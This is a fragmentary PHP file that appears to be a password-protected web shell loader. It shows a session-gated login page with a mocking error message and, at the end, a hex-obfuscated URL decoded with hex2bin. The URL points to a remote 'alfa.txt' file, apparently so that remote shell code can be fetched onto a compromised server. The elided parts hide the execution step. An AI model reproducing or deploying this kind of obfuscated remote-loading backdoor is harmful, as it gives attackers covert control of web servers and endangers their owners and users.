...
if (!isset($_SESSION['logged_in'])) {
    ...
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        if (password_verify($_POST['pass'], $ea)) {
            ...
            $error = "Wrong Baby Take Your Time";
        }
    }
?>
<!DOCTYPE html>
...
<body>
  <form class="login-box" method="post">
    ...
    <input type="text" name="user" placeholder="ID Pengguna" required>
...
$hexUrl = '68747470733a2f2f68746d6c2e6176617461722d616d702e696e666f2f6261636b75702f616c66612e747874';
$url = hex2bin($hexUrl);
